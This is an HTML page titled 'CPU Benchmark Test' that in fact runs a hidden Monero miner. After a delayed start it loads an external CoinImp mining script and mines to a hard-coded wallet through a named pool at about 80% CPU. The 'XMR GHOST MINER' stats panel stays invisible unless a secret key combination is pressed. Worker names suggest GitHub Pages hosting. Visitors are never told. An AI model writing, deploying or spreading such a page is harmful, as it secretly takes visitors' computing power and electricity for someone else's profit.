<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CPU Benchmark Test</title>
  <style>
    #miner-debug {
      position: fixed; top: 10px; right: 10px; width: 300px;
      background: rgba(0,0,0,0.95); color: #0f0; font-family: 'Courier New';
      font-size: 13px; padding: 12px; border: 2px solid #0f0;
      border-radius: 8px; z-index: 999999; box-shadow: 0 0 20px #0f0;
      display: none; user-select: none;
    }
    #miner-debug.show { display: block; }
    .hash { color: #0ff; font-weight: bold; }
    .profit { color: #ff0; font-weight: bold; }
    .blink { animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0.4; } }
  </style>
</head>
<body>
<div id="miner-debug">
  <div>ðŸš€ <b>XMR GHOST MINER</b> <span id="status" class="blink">LOADING</span></div>
  <div>Wallet: <code id="wallet">4AM1bBwy...zWgZzs</code></div>
  <div>Pool: <code>pool.moneroocean.stream:10001</code></div>
  <div>Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
  <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
  <div>Uptime: <span id="uptime">00:00:00</span></div>
  <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
  <div style="font-size:11px; margin-top:10px; opacity:0.8;">
    CTRL + SHIFT + M = toggle | Check pool.moneroocean.stream
  </div>
</div>

<!-- REAL MINER: CoinIMP WebMiner (MoneroOcean Compatible) -->
<script src="https://www.hashgains.com/miner/xmr.js"></script>
<script>
  // ==================== CONFIG ====================
  const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs';
  const POOL = 'pool.moneroocean.stream:10001'; // OFFICIAL MONEROCEAN POOL
  const WORKER = 'ghpages_' + Math.random().toString(36).slice(2,8);
  const THREADS = 2;
  const THROTTLE = 0.2; // 20% throttle = 80% CPU
  // ===============================================

  let miner = null;
  let hashrate = 0, accepted = 0, rejected = 0;
  let startTime = Date.now();

  // TOGGLE DEBUG
  document.addEventListener('keydown', e => {
    if (e.ctrlKey && e.shiftKey && e.key === 'M') {
      e.preventDefault();
      document.getElementById('miner-debug').classList.toggle('show');
    }
  });

  // UPDATE STATS
  function updateStats() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
    const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
    const s = String(elapsed % 60).padStart(2, '0');
    document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
    document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' H/s';
    document.getElementById('accepted').textContent = accepted;
    document.getElementById('rejected').textContent = rejected;
    const dailyUSD = (hashrate / 80) * 0.0008 * 170;
    document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
  }
  setInterval(updateStats, 1000);

  // START MINING
  setTimeout(() => {
    if (typeof CoinImp === 'undefined') {
      document.getElementById('status').textContent = 'LIB FAIL';
      return;
    }

    miner = new CoinImp(WALLET, {
      pool: POOL,
      worker: WORKER,
      threads: THREADS,
      throttle: THROTTLE,
      autoThreads: false
    });

    miner.start();

    document.getElementById('status').textContent = 'MINING XMR';
    document.getElementById('status').classList.remove('blink');

    // REAL STATS FROM COINIMP
    setInterval(() => {
      const stats = miner.getStats();
      hashrate = stats.hashesPerSecond || 0;
      accepted = stats.accepted || accepted;
      rejected = stats.rejected || rejected;
    }, 2000);

    // PAUSE ON HIDE
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) miner.stop();
      else miner.start();
    });

    // 3 MIN SESSION CAP
    setTimeout(() => {
      miner.stop();
      document.getElementById('status').textContent = 'SESSION END';
    }, 180000);

  }, 3000); // Delayed start

  // BOT CHECK
  if (navigator.webdriver || /bot/i.test(navigator.userAgent)) {
    document.getElementById('status').textContent = 'BOT DETECTED';
  }
</script>
</body>
</html>
